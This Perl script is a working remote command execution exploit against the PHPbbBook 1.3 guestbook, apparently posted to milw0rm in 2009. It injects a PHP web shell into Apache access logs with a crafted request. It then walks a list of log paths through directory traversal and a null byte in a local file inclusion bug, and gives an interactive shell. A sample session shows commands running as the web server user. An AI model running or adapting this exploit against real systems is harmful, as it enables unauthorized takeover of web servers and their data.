#!/usr/bin/perl

# -----------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------

# App   => PHPbbBook 1.3
# Downl => http://phpbbbook.syssap.nl/downloads/PHPbbBook-1.3h.zip

# Remote Command Execution Exploit (Log Inj)
# Bug: Local File Inclusion /-> /[path]/bbcode.php?l=[lf]%00
# by Osirys
# osirys[at]autistici[dot]org
# osirys.org


# ------------------------------------------------------------------
# Exploit in action [>!]
# ------------------------------------------------------------------
# osirys[~]>$ perl lfi_rce.txt http://localhost/PHPbbBook/ bbcode.php?l=

#   ---------------------------------
#         PHPbbBook RCE Exploit
#              via Log Inj
#               by Osirys
#   ---------------------------------

# [*] Injecting evil php code ..
# [*] Cheeking for Apache Logs ..
# [*] Apache Log Injection completed
# [*] Path: /var/log/httpd/access_log
# [!] Hi my master, do your job now [x]

# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pws
# bash: pws: command not found
# shell[localhost]$> pwd
# /home/osirys/web/PHPbbBook
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>
# ------------------------------------------------------------------


use IO::Socket::INET;
use LWP::UserAgent;

my $host       =  $ARGV[0];
my $lfi_path   =  $ARGV[1];
my $null_byte  =  "%00";
my $gotcha     =  0;
my $dir_trasv  = "../../../../../../../../../..";
my @logs_dirs  =  qw(
                      /var/log/httpd/access_log
                      /var/log/httpd/access.log
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/access_log
                      /logs/error.log
                      /logs/access.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /etc/httpd/logs/access_log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/access.log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /usr/local/apache/logs/access_log
                      /usr/local/apache/logs/access.log
                      /var/www/logs/access_log
                      /var/www/logs/access.log
                      /var/log/apache/access_log
                      /var/log/apache/access.log
                      /var/log/access_log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                      /apache/logs/access.log
                    );

my $php_code   =  "<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=st".
                  "ripslashes(\$_GET[cmd]);} system(\$_GET[cmd]);?>";

($host,$lfi_path) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


$sock = IO::Socket::INET->new(
                                PeerAddr => $h0st,
                                PeerPort => 80,
                                Proto => "tcp"
                             ) || die "Can't connect to $host:80!\n";

print "[*] Injecting evil php code ..\n";


print $sock "GET /Osirys_log_inj start0".$php_code."0end HTTP/1.1\r\n";
print $sock "Host: ".$host."\r\n";
print $sock "Connection: close\r\n\r\n";
close($sock);

print "[*] Cheeking for Apache Logs ..\n";

while (($log = <@logs_dirs>)&&($gotcha != 1)) {
    $tmp_path = $host.$lfi_path.$dir_trasv.$log.$null_byte;
    $re = get_req($tmp_path);
    if ($re =~ /Osirys_log_inj/) {
        $gotcha = 1;
        $log_path = $tmp_path;
        print "[*] Apache Log Injection completed\n";
        print "[*] Path: $log\n";
        print "[!] Hi my master, do your job now [x]\n\n";
        &exec_cmd;
    }
}

$gotcha == 1 || die "[-] Couldn't find Apache Logs\n";

sub exec_cmd {
    my @outs;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = $log_path."&cmd=".$cmd;
    $re = get_req($exec_url);
    if ($re =~ /start0(.+?)0end/sg) {
        if ($1 =~ /0end/) {
            $c++;
            $cmd =~ s/\n//;
            print "bash: ".$cmd.": command not found\n";
            $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
            &exec_cmd;
        }
        else {
            push(@outs,$1);
            foreach my $o(@outs) {
                print "$o";
            }
            &exec_cmd;
        }
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub banner {
    print "\n".
          "  --------------------------------- \n".
          "        PHPbbBook RCE Exploit       \n".
          "             via Log Inj            \n".
          "              by Osirys             \n".
          "  --------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input data failed ! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path lfi_path\n\n";
    exit(0);
}

# milw0rm.com [2009-02-04]